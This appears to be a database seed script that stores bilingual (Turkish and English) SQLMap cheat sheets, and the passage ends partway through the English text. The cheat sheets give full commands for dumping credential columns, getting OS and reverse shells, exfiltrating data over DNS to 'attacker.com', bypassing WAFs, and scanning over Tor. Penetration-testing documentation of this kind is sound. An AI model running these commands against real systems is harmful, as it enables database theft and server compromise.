import dbConnect from '../lib/dbConnect.js';
import Cheatsheet from '../models/Cheatsheet.js';
import Category from '../models/Category.js';
import mongoose from 'mongoose';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const envPath = path.join(__dirname, '..', '.env.local');
if (fs.existsSync(envPath)) {
    const lines = fs.readFileSync(envPath, 'utf-8').split(/\r?\n/);
    for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) continue;
        const idx = trimmed.indexOf('=');
        if (idx === -1) continue;
        const key = trimmed.slice(0, idx).trim();
        const val = trimmed.slice(idx + 1).trim();
        if (key && !(key in process.env)) process.env[key] = val;
    }
}

const contentTR = `# SQLMap - Automatic SQL Injection Tool

## 1. Araç Tanımı
**SQLMap**, SQL injection zafiyetlerini tespit etmek ve exploit etmek için geliştirilmiş, açık kaynaklı ve tam otomatik bir sızma testi aracıdır. Veritabanı parmak izi alma, veri çekme, dosya sistemine erişim ve işletim sistemi komutları çalıştırma gibi işlemleri otomatikleştirir. MySQL, Oracle, PostgreSQL, MSSQL, SQLite gibi popüler tüm veritabanlarını destekler.

## 2. Kurulum
*   **Kali Linux**: \`apt install sqlmap\` (Varsayılan yüklü gelir)
*   **GitHub**: \`git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\`
*   **Python**: Python 2.7 veya 3.x gerektirir.

## 3. Temel Kullanım

### Temel SQL Injection Testi
Hedef URL üzerindeki GET parametrelerini otomatik tarar.
\`\`\`bash
sqlmap -u "http://target.com/page.php?id=1"
\`\`\`
**Argüman Açıklamaları:**
*   **-u**: Hedef URL.

### Parametre Tarama
POST verisi, Cookie veya User-Agent gibi alanları test eder.
\`\`\`bash
sqlmap -u "http://target.com" --data="id=1&user=admin"
\`\`\`
**Argüman Açıklamaları:**
*   **--data**: POST body verisi.

### URL / Request Dosyası ile Test
Burp Suite gibi araçlardan kaydedilen tam HTTP isteğini kullanır. En stabil yöntemdir.
\`\`\`bash
sqlmap -r request.txt
\`\`\`
**Argüman Açıklamaları:**
*   **-r**: Raw HTTP request dosyası.

### Enum Seviyeleri (--level, --risk)
Testin derinliğini ve riskini belirler.
\`\`\`bash
sqlmap -u target.com --level 5 --risk 3
\`\`\`
**Argüman Açıklamaları:**
*   **--level**: 1-5 arası (Cookie ve Header testleri için artırılmalı).
*   **--risk**: 1-3 arası (Veri kaybı riski olan payloadlar için artırılmalı).

### Database Bilgisi Çekme
Mevcut veritabanı adlarını listeler.
\`\`\`bash
sqlmap -u target.com --dbs
\`\`\`
**Argüman Açıklamaları:**
*   **--dbs**: Database enumeration.

### Table / Column Enumerate
Tablo ve kolon isimlerini çeker.
\`\`\`bash
sqlmap -u target.com -D users_db --tables
sqlmap -u target.com -D users_db -T admin --columns
\`\`\`
**Argüman Açıklamaları:**
*   **-D**: Hedef veritabanı.
*   **-T**: Hedef tablo.
*   **--tables**: Tabloları listele.
*   **--columns**: Kolonları listele.

### Dump İşlemleri
Veritabanındaki verileri dışarı aktarır.
\`\`\`bash
sqlmap -u target.com -D users_db -T admin --dump
\`\`\`
**Argüman Açıklamaları:**
*   **--dump**: Veriyi çek ve kaydet.

### OS Shell / SQL Shell Alma
Sistemde komut çalıştırma veya interaktif SQL konsolu açma.
\`\`\`bash
sqlmap -u target.com --os-shell
sqlmap -u target.com --sql-shell
\`\`\`
**Argüman Açıklamaları:**
*   **--os-shell**: İşletim sistemi shell'i (xp_cmdshell, into outfile vb. kullanır).
*   **--sql-shell**: SQL sorgu konsolu.

### Tam Otomatik Mod
Kullanıcıya soru sormadan varsayılan cevaplarla ilerler.
\`\`\`bash
sqlmap -u target.com --batch
\`\`\`
**Argüman Açıklamaları:**
*   **--batch**: Non-interactive mod.

### Tam Manuel Payload Modları
Kullanıcının belirlediği payloadları kullanır.
\`\`\`bash
sqlmap -u target.com --prefix="')" --suffix="#"
\`\`\`

## 4. İleri Seviye Kullanım

### Tam Otomatik Detection Mantığı
SQLMap, Heuristic check ile önce WAF/IPS kontrolü yapar, ardından parametrenin dinamik olup olmadığını test eder ve injection tipini (Boolean, Error, Time, Union) belirler.

### Boolean-based, Error-based, Time-based, Union-based Teknikleri
*   **Boolean-based**: Sayfa içeriğindeki True/False değişimine bakar.
*   **Error-based**: Veritabanı hata mesajlarını analiz eder.
*   **Time-based**: \`SLEEP()\` veya \`WAITFOR DELAY\` ile gecikme ölçer (Blind SQLi).
*   **Union-based**: \`UNION SELECT\` ile veriyi sayfa içeriğine yansıtır (En hızlısı).

### WAF/IPS Bypass Teknikleri
Tamper scriptleri ile payloadlar encode edilir veya değiştirilir.
\`\`\`bash
sqlmap -u target.com --tamper="space2comment,between"
\`\`\`

### Tam Manuel Payload Ekleme
Otomatik tespit başarısızsa, injection noktası \`*\` ile belirtilir.
\`\`\`bash
sqlmap -u "http://target.com/vuln.php?id=1*"
\`\`\`

### Custom Tampering Script Kullanımı
Python ile yazılmış özel tamper scriptleri kullanılabilir. Payload'u WAF'ın anlayamayacağı formata sokar.

### Tor + SQLMap Entegrasyonu
Anonimlik için Tor ağı kullanılır.
\`\`\`bash
sqlmap -u target.com --tor --tor-type=socks5 --check-tor
\`\`\`

### Proxy (Burp Suite) Entegrasyonu
Trafiği Burp üzerinden geçirerek analiz etmek için.
\`\`\`bash
sqlmap -u target.com --proxy="http://127.0.0.1:8080"
\`\`\`

### Authenticated Request Brute-Force
Login gerektiren sayfalarda Cookie veya Header manipülasyonu.
\`\`\`bash
sqlmap -u target.com --cookie="PHPSESSID=..."
\`\`\`

### File-based Request (-r) İncelemeleri
Karmaşık POST istekleri veya SOAP/XML requestleri için raw dosya kullanımı en güvenilir yöntemdir.

### Request Forgery
Host header veya Origin header injection testleri için \`--headers\` veya \`-r\` kullanılır.

### Injection Point Forcing
SQLMap'in test edeceği parametreleri zorlamak.
\`\`\`bash
sqlmap -u target.com --param-del=";" --data="id=1;user=admin"
\`\`\`

### Heuristic Detection Mantığı
\`--smart\` parametresi ile sadece pozitif heuristic sonuç veren parametreler derinlemesine taranır.

### Database Privilege Escalation
\`--priv-esc\` ile veritabanı kullanıcısının yetkilerini (DBA vb.) yükseltmeye çalışır.

### DBMS-Specific Saldırılar
*   **MySQL**: \`INTO OUTFILE\`, UDF injection.
*   **MSSQL**: \`xp_cmdshell\`, OLE Automation.
*   **PostgreSQL**: \`COPY TO/FROM PROGRAM\`.

### OS-Level Command Execution
Veritabanı yetkisi varsa \`--os-pwn\` ile Metasploit entegrasyonu veya \`--os-shell\` ile komut satırı alınır.

### DNS Exfiltration
Blind SQLi çok yavaş olduğunda, veriyi DNS sorguları üzerinden (port 53) kaçırır.
\`\`\`bash
sqlmap -u target.com --dns-domain="attacker.com"
\`\`\`

### Chunked Data Dumping
Büyük verileri parça parça çeker.

### Large Table Dumping Optimizasyonu
\`--threads\` artırılır ve \`--start\` / \`--stop\` ile aralık belirtilir.

### Multi-Threading Teknikleri
\`--threads 10\` ile HTTP istekleri paralelleştirilir. Time-based injection hariç hızı artırır.

### Tampering Scripts Detayları
*   **space2comment**: Boşlukları \`/**/\` ile değiştirir.
*   **charunicodeescape**: Karakterleri Unicode escape yapar.
*   **percentage**: Karakter arasına \`%\` ekler (ASP bypass).

## 5. Açıklamalı Komutlar (GENİŞ LİSTE)

### Temel Argümanlar

**Komut:**
\`\`\`bash
sqlmap -u "http://site.com/item.php?id=1" --dbs
\`\`\`
**Açıklama:**
Hedef URL üzerinde SQL injection test eder ve mevcut veritabanlarını enumerate eder.
**Argüman Açıklamaları:**
*   **-u**: Hedef URL.
*   **--dbs**: Database listesi.

**Komut:**
\`\`\`bash
sqlmap -u target.com --batch --random-agent
\`\`\`
**Açıklama:**
Otomatik modda ve rastgele User-Agent ile tarama yapar.
**Argüman Açıklamaları:**
*   **--batch**: Kullanıcı girdisi beklemez.
*   **--random-agent**: User-Agent başlığını değiştirir.

**Komut:**
\`\`\`bash
sqlmap -r req.txt --level 5 --risk 3
\`\`\`
**Açıklama:**
Request dosyasını kullanarak en yüksek seviyede test yapar.
**Argüman Açıklamaları:**
*   **-r**: Raw request dosyası.
*   **--level 5**: Tüm header ve cookie'leri test eder.
*   **--risk 3**: OR-based gibi riskli testleri de yapar.

### Database Enumeration

**Komut:**
\`\`\`bash
sqlmap -u target.com -D app_db --tables
\`\`\`
**Açıklama:**
'app_db' veritabanındaki tabloları listeler.
**Argüman Açıklamaları:**
*   **-D**: Database adı.
*   **--tables**: Tablo listeleme.

**Komut:**
\`\`\`bash
sqlmap -u target.com -D app_db -T users --columns
\`\`\`
**Açıklama:**
'users' tablosundaki kolonları listeler.
**Argüman Açıklamaları:**
*   **-T**: Tablo adı.
*   **--columns**: Kolon listeleme.

**Komut:**
\`\`\`bash
sqlmap -u target.com -D app_db -T users -C user,pass --dump
\`\`\`
**Açıklama:**
'users' tablosundaki 'user' ve 'pass' kolonlarını çeker.
**Argüman Açıklamaları:**
*   **-C**: Kolon seçimi.
*   **--dump**: Veriyi indir.

**Komut:**
\`\`\`bash
sqlmap -u target.com --schema --batch
\`\`\`
**Açıklama:**
Tüm veritabanı şemasını (yapısını) çıkarır.
**Argüman Açıklamaları:**
*   **--schema**: DB şeması.

**Komut:**
\`\`\`bash
sqlmap -u target.com --count -D app_db
\`\`\`
**Açıklama:**
Tablolardaki kayıt sayısını gösterir.
**Argüman Açıklamaları:**
*   **--count**: Kayıt sayısı sayma.

### Injection Techniques

**Komut:**
\`\`\`bash
sqlmap -u target.com --technique=BEU
\`\`\`
**Açıklama:**
Sadece Boolean, Error ve Union tekniklerini kullanır.
**Argüman Açıklamaları:**
*   **--technique**: B(Boolean), E(Error), U(Union), S(Stacked), T(Time), Q(Inline).

**Komut:**
\`\`\`bash
sqlmap -u target.com --string="Success"
\`\`\`
**Açıklama:**
Boolean injection için "Success" string'ini True condition olarak belirler.
**Argüman Açıklamaları:**
*   **--string**: True condition string.

**Komut:**
\`\`\`bash
sqlmap -u target.com --union-cols=5
\`\`\`
**Açıklama:**
Union injection için kolon sayısını 5 olarak zorlar.
**Argüman Açıklamaları:**
*   **--union-cols**: Kolon sayısı aralığı veya değeri.

### WAF & Bypass

**Komut:**
\`\`\`bash
sqlmap -u target.com --tamper="space2comment,randomcase"
\`\`\`
**Açıklama:**
Payload'u WAF'tan kaçırmak için tamper scriptleri uygular.
**Argüman Açıklamaları:**
*   **--tamper**: Tamper script listesi.

**Komut:**
\`\`\`bash
sqlmap -u target.com --identify-waf
\`\`\`
**Açıklama:**
Hedefteki WAF/IPS türünü tespit etmeye çalışır.
**Argüman Açıklamaları:**
*   **--identify-waf**: WAF tespiti.

**Komut:**
\`\`\`bash
sqlmap -u target.com --delay=2 --safe-freq=10
\`\`\`
**Açıklama:**
Rate-limit'e takılmamak için gecikme ekler.
**Argüman Açıklamaları:**
*   **--delay**: İstekler arası saniye.
*   **--safe-freq**: Her N istekte bir güvenli URL'ye git.

### Network / Proxy / Tor

**Komut:**
\`\`\`bash
sqlmap -u target.com --tor --tor-type=socks5 --check-tor
\`\`\`
**Açıklama:**
Tor ağı üzerinden anonim tarama yapar.
**Argüman Açıklamaları:**
*   **--tor**: Tor kullanımı.
*   **--check-tor**: Tor bağlantısını doğrula.

**Komut:**
\`\`\`bash
sqlmap -u target.com --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
\`\`\`
**Açıklama:**
Proxy üzerinden ve kimlik doğrulama ile çıkar.
**Argüman Açıklamaları:**
*   **--proxy**: Proxy URL.
*   **--proxy-cred**: Proxy user:pass.

**Komut:**
\`\`\`bash
sqlmap -u target.com --threads 10
\`\`\`
**Açıklama:**
10 paralel thread kullanır.
**Argüman Açıklamaları:**
*   **--threads**: Thread sayısı.

### OS / SQL Execution

**Komut:**
\`\`\`bash
sqlmap -u target.com --os-shell
\`\`\`
**Açıklama:**
İşletim sistemi komut satırı (shell) almaya çalışır.
**Argüman Açıklamaları:**
*   **--os-shell**: Interactive OS shell.

**Komut:**
\`\`\`bash
sqlmap -u target.com --sql-query="SELECT @@version"
\`\`\`
**Açıklama:**
Özel bir SQL sorgusu çalıştırır.
**Argüman Açıklamaları:**
*   **--sql-query**: Çalıştırılacak SQL.

**Komut:**
\`\`\`bash
sqlmap -u target.com --priv-esc
\`\`\`
**Açıklama:**
Veritabanı yetkilerini yükseltmeye çalışır.
**Argüman Açıklamaları:**
*   **--priv-esc**: Privilege escalation.

## 6. Gerçek Pentest Senaryoları

### Error-based SQLi Exploit
\`\`\`bash
sqlmap -u "http://target.com/view.php?id=1" --technique=E --dbs
\`\`\`
**Açıklama:**
Sadece hata tabanlı injection deneyerek veritabanlarını listeler. Hızlı sonuç verir.

### Time-based Kör Injection
\`\`\`bash
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --technique=T --level 5
\`\`\`
**Açıklama:**
Login formunda yanıt dönmeyen (blind) durumlarda zaman gecikmesi ile test yapar.

### WAF Arkasındaki Endpoint Exploit
\`\`\`bash
sqlmap -u target.com --tamper="between,randomcase,space2comment" --random-agent -v 3
\`\`\`
**Açıklama:**
WAF'ı atlatmak için çoklu tamper scriptleri ve rastgele User-Agent kullanır.

### Cookie-based Injection
\`\`\`bash
sqlmap -u target.com --cookie="id=1*" --level 2
\`\`\`
**Açıklama:**
Cookie içindeki 'id' parametresine injection dener. Level 2 gerektirir.

### User-Agent Injection
\`\`\`bash
sqlmap -u target.com --level 3
\`\`\`
**Açıklama:**
User-Agent ve Referer başlıklarını test eder (Level 3+).

### POST Request Injection
\`\`\`bash
sqlmap -u target.com --data="search=test" --method=POST
\`\`\`
**Açıklama:**
POST metodu ile gönderilen search parametresini test eder.

### Authentication Bypass (Boolean-based)
\`\`\`bash
sqlmap -u target.com/login.php --data="user=admin&pass=*" --technique=B
\`\`\`
**Açıklama:**
Login bypass için Boolean-based teknikleri dener.

### Database Enumerate → Table → Column → Dump Workflow
\`\`\`bash
sqlmap -u target.com --dbs
sqlmap -u target.com -D site_db --tables
sqlmap -u target.com -D site_db -T users --dump
\`\`\`
**Açıklama:**
Standart veri çekme iş akışı.

### MySQL → MSSQL → PostgreSQL → Oracle Özel Saldırılar
\`\`\`bash
sqlmap -u target.com --dbms=MySQL
\`\`\`
**Açıklama:**
DBMS tipini manuel belirterek payloadları optimize eder.

### Large Table Chunk Dumping
\`\`\`bash
sqlmap -u target.com -D db -T logs --dump --start=1 --stop=100
\`\`\`
**Açıklama:**
Milyonlarca satırlık tablodan sadece ilk 100 satırı çeker.

### OS Shell Alma
\`\`\`bash
sqlmap -u target.com --os-shell
\`\`\`
**Açıklama:**
DBA yetkisi varsa \`xp_cmdshell\` veya \`UDF\` yükleyerek shell alır.

### Reverse Shell Tetikleme
\`\`\`bash
sqlmap -u target.com --os-pwn --msf-path=/usr/share/metasploit-framework
\`\`\`
**Açıklama:**
Metasploit entegrasyonu ile Meterpreter session açar.

### DNS Exfiltration ile Veri Çıkartma
\`\`\`bash
sqlmap -u target.com --dns-domain=attacker.com
\`\`\`
**Açıklama:**
Blind SQLi verisini DNS sorguları içine gömerek kaçırır (Çok daha hızlıdır).

### Proxy/Burp Üzerinden Injection Testleri
\`\`\`bash
sqlmap -u target.com --proxy=http://127.0.0.1:8080
\`\`\`
**Açıklama:**
Trafiği Burp Suite üzerinden geçirerek manuel analiz imkanı sağlar.

### Tor Üzerinden Stealth SQLi
\`\`\`bash
sqlmap -u target.com --tor --check-tor --time-sec=10
\`\`\`
**Açıklama:**
Tor üzerinden gizli tarama, timeout artırılmalıdır.

### Rate-Limit Bypass Teknikleri
\`\`\`bash
sqlmap -u target.com --delay=5 --safe-url="http://target.com/index.php" --safe-freq=5
\`\`\`
**Açıklama:**
Her 5 istekte bir ana sayfaya giderek session'ı taze tutar ve 5 saniye bekler.

### Tamper Script Cascade
\`\`\`bash
sqlmap -u target.com --tamper="apostrophemask,apostrophenullencode,base64encode"
\`\`\`
**Açıklama:**
Payload'u sırasıyla birden fazla tamper scriptinden geçirir.

### Blind Injection Acceleration
\`\`\`bash
sqlmap -u target.com --technique=T --threads 10 --predict-output
\`\`\`
**Açıklama:**
Tahminleme algoritmaları ve threading ile blind injection'ı hızlandırır.

### 2FA Arkasındaki Parametrelerde SQLi Testi
\`\`\`bash
sqlmap -u target.com --cookie="PHPSESSID=valid_session; 2fa_token=valid_token"
\`\`\`
**Açıklama:**
Geçerli session ve token bilgileri cookie olarak verilerek test yapılır.

### JSON Body Injection
\`\`\`bash
sqlmap -r json_request.txt
\`\`\`
**Açıklama:**
JSON formatındaki POST verisini içeren request dosyası ile test.

## 8. Best Practices (Uzman Seviye)

*   **Level/Risk**: Gereksiz yere \`--level 5 --risk 3\` yapmayın, tarama çok uzar. Varsayılan (1) ile başlayın.
*   **Tamper**: Scriptleri rastgele değil, WAF tipine göre veya mantıksal sırayla (örn: space bypass -> quote bypass) deneyin.
*   **Large-Table**: Büyük tablolarda \`--threads\` artırın ancak Time-based injection'da thread işe yaramaz.
*   **File-Based Request**: \`-r\` kullanmak, cookie ve header karmaşasını önler, en stabil yöntemdir.
*   **Proxy**: Şüpheli durumlarda \`--proxy\` ile trafiği Burp'e atıp payload'un nasıl gittiğini gözle kontrol edin.
*   **Tor Timeout**: Tor kullanırken \`--time-sec\` değerini artırın, aksi halde false negative alırsınız.
*   **Blind Delay**: Ağ gecikmesi varsa \`--time-sec\` değerini artırın.
*   **Heuristic**: Heuristic check bazen yanılabilir, manuel doğrulama yapın.
*   **Output Temizliği**: \`~/.local/share/sqlmap/output\` klasörünü düzenli temizleyin veya \`--flush-session\` kullanın.
*   **Enum vs Dump**: Önce \`--dbs\`, sonra \`--tables\`, en son \`--dump\` yapın. Hepsini aynı anda istemeyin.
*   **DB Specifics**: Hedef DBMS belliyse \`--dbms\` parametresini mutlaka kullanın.

## 9. Sık Yapılan Hatalar

*   **Gereksiz Yüksek Level**: Basit bir GET parametresi için \`--level 5\` kullanıp saatlerce beklemek.
*   **Yanlış Endpoint**: Injection olmayan statik bir sayfayı taramak.
*   **CSRF Token**: CSRF token olan formlarda \`--csrf-token\` veya \`--csrf-url\` kullanmamak.
*   **Eski Cookie**: Oturum düştüğü halde eski cookie ile taramaya devam etmek (Session expired hatası alınır).
*   **Yanlış Tamper**: ASP.NET sitesine PHP tamper scripti denemek.
*   **Proxy Unutmak**: Proxy açık kalıp Burp kapalıyken bağlantı hatası almak.
*   **Kısa Timeout**: Blind injection'da timeout'u kısa tutup zafiyeti kaçırmak.
*   **Tek Seferde Dump**: 10GB'lık tabloyu \`--start/--stop\` kullanmadan çekmeye çalışmak.
*   **Hatalı Raw Request**: Request dosyasında boş satırları yanlış kopyalamak.
*   **Output Kirliliği**: Eski session dosyaları yüzünden yeni taramanın güncel veriyi görmemesi (\`--flush-session\` gerekir).
*   **DBMS Yanılgısı**: MySQL sanıp MSSQL payloadları denemek (Otomatik tespit başarısızsa).
`;

const contentEN = `# SQLMap - Automatic SQL Injection Tool

## 1. Tool Definition
**SQLMap** is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

## 2. Installation
*   **Kali Linux**: \`apt install sqlmap\` (Pre-installed)
*   **GitHub**: \`git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\`
*   **Python**: Requires Python 2.7 or 3.x.

## 3. Basic Usage

### Basic SQL Injection Test
Automatically scans GET parameters on the target URL.
\`\`\`bash
sqlmap -u "http://target.com/page.php?id=1"
\`\`\`
**Argument Explanations:**
*   **-u**: Target URL.

### Parameter Scanning
Tests POST data, Cookie, or User-Agent fields.
\`\`\`bash
sqlmap -u "http://target.com" --data="id=1&user=admin"
\`\`\`
**Argument Explanations:**
*   **--data**: POST body data.

### Test with URL / Request File
Uses a full HTTP request saved from tools like Burp Suite. Most stable method.
\`\`\`bash
sqlmap -r request.txt
\`\`\`
**Argument Explanations:**
*   **-r**: Raw HTTP request file.

### Enum Levels (--level, --risk)
Determines the depth and risk of the test.
\`\`\`bash
sqlmap -u target.com --level 5 --risk 3
\`\`\`
**Argument Explanations:**
*   **--level**: 1-5 (Increase for Cookie and Header tests).
*   **--risk**: 1-3 (Increase for risky payloads).

### Fetching Database Info
Lists available database names.
\`\`\`bash
sqlmap -u target.com --dbs
\`\`\`
**Argument Explanations:**
*   **--dbs**: Database enumeration.

### Table / Column Enumerate
Retrieves table and column names.
\`\`\`bash
sqlmap -u target.com -D users_db --tables
sqlmap -u target.com -D users_db -T admin --columns
\`\`\`
**Argument Explanations:**
*   **-D**: Target database.
*   **-T**: Target table.
*   **--tables**: List tables.
*   **--columns**: List columns.

### Dump Operations
Exports data from the database.
\`\`\`bash
sqlmap -u target.com -D users_db -T admin --dump
\`\`\`
**Argument Explanations:**
*   **--dump**: Retrieve and save data.

### OS Shell / SQL Shell Access
Execute system commands or open interactive SQL console.
\`\`\`bash
sqlmap -u target.com --os-shell
sqlmap -u target.com --sql-shell
\`\`\`
**Argument Explanations:**
*   **--os-shell**: OS shell access (uses xp_cmdshell, into outfile etc.).
*   **--sql-shell**: SQL query console.

### Fully Automatic Mode
Proceeds with default answers without asking user.
\`\`\`bash
sqlmap -u target.com --batch
\`\`\`
**Argument Explanations:**
*   **--batch**: Non-interactive mode.

### Full Manual Payload Modes
Uses user-defined payloads.
\`\`\`bash
sqlmap -u target.com --prefix="')" --suffix="#"
\`\`\`

## 4. Advanced Usage

### Full Automatic Detection Logic
SQLMap first performs WAF/IPS checks via Heuristic check, then tests if the parameter is dynamic, and determines the injection type (Boolean, Error, Time, Union).

### Boolean-based, Error-based, Time-based, Union-based Techniques
*   **Boolean-based**: Checks for True/False changes in page content.
*   **Error-based**: Analyzes database error messages.
*   **Time-based**: Measures delay with \`SLEEP()\` or \`WAITFOR DELAY\` (Blind SQLi).
*   **Union-based**: Reflects data into page content using \`UNION SELECT\` (Fastest).

### WAF/IPS Bypass Techniques
Payloads are encoded or modified using tamper scripts.
\`\`\`bash
sqlmap -u target.com --tamper="space2comment,between"
\`\`\`

### Full Manual Payload Injection
If auto-detection fails, specify injection point with \`*\`.
\`\`\`bash
sqlmap -u "http://target.com/vuln.php?id=1*"
\`\`\`

### Custom Tampering Script Usage
Custom tamper scripts written in Python can be used to format payloads to bypass WAF.

### Tor + SQLMap Integration
Uses Tor network for anonymity.
\`\`\`bash
sqlmap -u target.com --tor --tor-type=socks5 --check-tor
\`\`\`

### Proxy (Burp Suite) Integration
Route traffic through Burp for analysis.
\`\`\`bash
sqlmap -u target.com --proxy="http://127.0.0.1:8080"
\`\`\`

### Authenticated Request Brute-Force
Cookie or Header manipulation on pages requiring login.
\`\`\`bash
sqlmap -u target.com --cookie="PHPSESSID=..."
\`\`\`

### File-based Request (-r) Analysis
Using raw files is the most reliable method for complex POST requests or SOAP/XML requests.

### Request Forgery
Use \`--headers\` or \`-r\` for Host header or Origin header injection tests.

### Injection Point Forcing
Forcing the parameters SQLMap will test.
\`\`\`bash
sqlmap -u target.com --param-del=";" --data="id=1;user=admin"
\`\`\`

### Heuristic Detection Logic
With \`--smart\`, only parameters giving positive heuristic results are scanned deeply.

### Database Privilege Escalation
Attempts to escalate database user privileges (DBA etc.) with \`--priv-esc\`.

### DBMS-Specific Attacks
*   **MySQL**: \`INTO OUTFILE\`, UDF injection.
*   **MSSQL**: \`xp_cmdshell\`, OLE Automation.
*   **PostgreSQL**: \`COPY TO/FROM PROGRAM\`.

### OS-Level Command Execution
If DB privileges allow, get command line via \`--os-pwn\` (Metasploit) or \`--os-shell\`.

### DNS Exfiltration
Exfiltrates data via DNS queries (port 53) when Blind SQLi is too slow.
\`\`\`bash
sqlmap -u target.com --dns-domain="attacker.com"
\`\`\`

### Chunked Data Dumping
Retrieves large data in chunks.

### Large Table Dumping Optimization
Increase \`--threads\` and specify range with \`--start\` / \`--stop\`.

### Multi-Threading Techniques
\`--threads 10\` parallelizes HTTP requests. Increases speed except for Time-based injection.

### Tampering Scripts Details
*   **space2comment**: Replaces spaces with \`/**/\`.
*   **charunicodeescape**: Unicode escapes characters.
*   **percentage**: Adds \`%\` between characters (ASP bypass).

## 5. Annotated Commands (EXTENSIVE LIST)

### Basic Arguments

**Command:**
\`\`\`bash
sqlmap -u "http://site.com/item.php?id=1" --dbs
\`\`\`
**Description:**
Tests for SQL injection on target URL and enumerates databases.
**Argument Explanations:**
*   **-u**: Target URL.
*   **--dbs**: List databases.

**Command:**
\`\`\`bash
sqlmap -u target.com --batch --random-agent
\`\`\`
**Description:**
Scans in automatic mode with random User-Agent.
**Argument Explanations:**
*   **--batch**: Do not ask for user input.
*   **--random-agent**: Change User-Agent header.

**Command:**
\`\`\`bash
sqlmap -r req.txt --level 5 --risk 3
\`\`\`
**Description:**
Tests at highest level using request file.
**Argument Explanations:**
*   **-r**: Raw request file.
*   **--level 5**: Tests all headers and cookies.
*   **--risk 3**: Performs risky tests like OR-based.

### Database Enumeration

**Command:**
\`\`\`bash
sqlmap -u target.com -D app_db --tables
\`\`\`
**Description:**
Lists tables in 'app_db' database.
**Argument Explanations:**
*   **-D**: Database name.
*   **--tables**: List tables.

**Command:**
\`\`\`bash
sqlmap -u target.com -D app_db -T users --columns
\`\`\`
**Description:**
Lists columns in 'users' table.
**Argument Explanations:**
*   **-T**: Table name.
*   **--columns**: List columns.

**Command:**
\`\`\`bash
sqlmap -u target.com -D app_db -T users -C user,pass --dump
\`\`\`
**Description:**
Retrieves 'user' and 'pass' columns from 'users' table.
**Argument Explanations:**
*   **-C**: Column selection.
*   **--dump**: Download data.

**Command:**
\`\`\`bash
sqlmap -u target.com --schema --batch
\`\`\`
**Description:**
Extracts entire database schema (structure).
**Argument Explanations:**
*   **--schema**: DB schema.

**Command:**
\`\`\`bash
sqlmap -u target.com --count -D app_db
\`\`\`
**Description:**
Shows number of records in tables.
**Argument Explanations:**
*   **--count**: Count records.

### Injection Techniques

**Command:**
\`\`\`bash
sqlmap -u target.com --technique=BEU
\`\`\`
**Description:**
Uses only Boolean, Error, and Union techniques.
**Argument Explanations:**
*   **--technique**: B(Boolean), E(Error), U(Union), S(Stacked), T(Time), Q(Inline).

**Command:**
\`\`\`bash
sqlmap -u target.com --string="Success"
\`\`\`
**Description:**
Sets "Success" string as True condition for Boolean injection.
**Argument Explanations:**
*   **--string**: True condition string.

**Command:**
\`\`\`bash
sqlmap -u target.com --union-cols=5
\`\`\`
**Description:**
Forces column count to 5 for Union injection.
**Argument Explanations:**
*   **--union-cols**: Column count range or value.

### WAF & Bypass

**Command:**
\`\`\`bash
sqlmap -u target.com --tamper="space2comment,randomcase"
\`\`\`
**Description:**
Applies tamper scripts to bypass WAF.
**Argument Explanations:**
*   **--tamper**: List of tamper scripts.

**Command:**
\`\`\`bash
sqlmap -u target.com --identify-waf
\`\`\`
**Description:**
Attempts to identify WAF/IPS type.
**Argument Explanations:**
*   **--identify-waf**: WAF identification.

**Command:**
\`\`\`bash
sqlmap -u target.com --delay=2 --safe-freq=10
\`\`\`
**Description:**
Adds delay to bypass rate-limiting.
**Argument Explanations:**
*   **--delay**: Seconds between requests.
*   **--safe-freq**: Visit safe URL every N requests.

### Network / Proxy / Tor

**Command:**
\`\`\`bash
sqlmap -u target.com --tor --tor-type=socks5 --check-tor
\`\`\`
**Description:**
Anonymous scan over Tor network.
**Argument Explanations:**
*   **--tor**: Use Tor.
*   **--check-tor**: Verify Tor connection.

**Command:**
\`\`\`bash
sqlmap -u target.com --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
\`\`\`
**Description:**
Scan via proxy with authentication.
**Argument Explanations:**
*   **--proxy**: Proxy URL.
*   **--proxy-cred**: Proxy user:pass.

**Command:**
\`\`\`bash
sqlmap -u target.com --threads 10
\`\`\`
**Description:**
Uses 10 parallel threads.
**Argument Explanations:**
*   **--threads**: Thread count.

### OS / SQL Execution

**Command:**
\`\`\`bash
sqlmap -u target.com --os-shell
\`\`\`
**Description:**
Attempts to get OS shell.
**Argument Explanations:**
*   **--os-shell**: Interactive OS shell.

**Command:**
\`\`\`bash
sqlmap -u target.com --sql-query="SELECT @@version"
\`\`\`
**Description:**
Executes custom SQL query.
**Argument Explanations:**
*   **--sql-query**: SQL to execute.

**Command:**
\`\`\`bash
sqlmap -u target.com --priv-esc
\`\`\`
**Description:**
Attempts to escalate DB privileges.
**Argument Explanations:**
*   **--priv-esc**: Privilege escalation.

## 6. Real Pentest Scenarios

### Error-based SQLi Exploit
\`\`\`bash
sqlmap -u "http://target.com/view.php?id=1" --technique=E --dbs
\`\`\`
**Description:**
Lists databases using only error-based injection. Fast results.

### Time-based Blind Injection
\`\`\`bash
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --technique=T --level 5
\`\`\`
**Description:**
Tests login form with time delay when no response is returned (blind).

### Exploit Endpoint behind WAF
\`\`\`bash
sqlmap -u target.com --tamper="between,randomcase,space2comment" --random-agent -v 3
\`\`\`
**Description:**
Uses multiple tamper scripts and random User-Agent to bypass WAF.

### Cookie-based Injection
\`\`\`bash
sqlmap -u target.com --cookie="id=1*" --level 2
\`\`\`
**Description:**
Attempts injection on 'id' parameter inside Cookie. Requires Level 2.

### User-Agent Injection
\`\`\`bash
sqlmap -u target.com --level 3
\`\`\`
**Description:**
Tests User-Agent and Referer headers (Level 3+).

### POST Request Injection
\`\`\`bash
sqlmap -u target.com --data="search=test" --method=POST
\`\`\`
**Description:**
Tests search parameter sent via POST method.

### Authentication Bypass (Boolean-based)
\`\`\`bash
sqlmap -u target.com/login.php --data="user=admin&pass=*" --technique=B
\`\`\`
**Description:**
